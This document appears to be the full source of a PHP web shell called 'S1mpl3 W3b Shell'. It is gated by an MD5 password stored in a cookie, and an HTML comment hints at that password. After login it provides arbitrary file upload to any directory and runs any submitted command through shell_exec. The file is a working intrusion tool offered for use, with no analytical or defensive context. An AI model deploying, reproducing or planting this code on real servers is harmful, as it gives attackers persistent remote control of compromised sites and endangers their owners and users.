<!-- Myat Min Moe -->

<?php
echo '<body style="background-color:#000000;">';

define('PASSWORD', 'ae35e94ac1d5a4a521d44f1a09a114e9');

if (isset($_COOKIE['shellowner'])) {
   if (strcmp($_COOKIE['shellowner'], PASSWORD) == 0) {
?>

<h2 align="center" style='color: #00ff00';>S1mpl3 W3b Shell</h2><br>
<p><label for="ip" style="color:#00ff00";>Server IP: &nbsp;</label><span style="color:#00ff00";><?php echo $_SERVER['SERVER_NAME']; ?></span></p>

<form style="opacity: 0.5;" action="" method="POST" enctype="multipart/form-data">
<p><label for="fu" style="color:#00ff00";>File Upload: </label>&nbsp;&nbsp;<input type="text" placeholder="Upload Directory" name="upload" style="color:#00ff00";>
</p>
<input type="file" name="file" style="color: #00ff00";/>
<input type="submit" value="Upload"/>
</form>

<form action='<?php echo $_SERVER["PHP_SELF"]?>' style="opacity: 0.5;" method="post">
<p><label for="cmd" style="color:#00ff00";>Command Execution: &nbsp;&nbsp;</label>
<input type= "text" name="command" />
<input type="submit" value="Run"/>
</p>
</form>



<?php 
   if(isset($_FILES['file'])){
      $errors= array();
      $file_name = $_FILES['file']['name'];
      $file_size =$_FILES['file']['size'];
      $file_tmp =$_FILES['file']['tmp_name'];
      $file_type=$_FILES['file']['type'];   
      $file_ext=strtolower(end(explode('.',$_FILES['file']['name'])));
               
      if(empty($errors)==true){
         move_uploaded_file($file_tmp,$_POST['upload'].$file_name);
         echo '<pre><span style="font-size: 11px; color: #FFFFFF;">';
         echo 'Upload: ' . $_FILES['file']['name'] . '<br />';
         echo 'Size: ' . ($_FILES['file']['size'] / 1024) . ' Kb<br />';
         echo 'Stored in: ' . $_POST['upload'];
         echo '</span></pre>';
      }else{
         print "<span style='color: #00ff00';>Make sure you have write permission!</span>";
      }
   }
   function exec_cmd(){
      if (isset($_POST['command'])){
         $exc = $_POST['command']; echo shell_exec($exc);
      }
   }
   echo '<pre><span style="font-size:12px;color:#15ed15;">';
   exec_cmd();
   echo '</span></pre>';
?>

<?php
      exit;
   } else {
      echo '<span style="color:#ffffff;opacity: 0.5;">Access Denied!</span>';
      exit;
   }
} 

// Validate Login
if (isset($_GET['p']) && $_GET['p'] == 'login') {
   if (strcmp(md5($_POST['mypass']), PASSWORD) == 0) {
      setcookie('shellowner', md5($_POST['mypass']), time()+1200);
      header("Location: $_SERVER[PHP_SELF]");
   } else {

   }
}
?>
<p align="center"><img src="https://camo.githubusercontent.com/42ff188e6c07562e20e4bf864f990310f1f025ca/68747470733a2f2f636872697363617265792e636f6d2f77702f77702d636f6e74656e742f75706c6f6164732f323030382f30322f53637265656e2d53686f742d323031342d30382d31372d61742d342e32322e35372d504d2e706e67"/></p>
<form style="opacity: 0.5;" action='<?php echo $_SERVER["PHP_SELF"]; ?>?p=login' method="post">
<p align="center" style="color: rgb(0,255,0)";>
Enter Password : &nbsp;
<input type="password" name="mypass" id="mypass" /> &nbsp;&nbsp;&nbsp;
<input type="submit" id="submit" value="Login" />



<!-- Password: l33t? -->





</form>
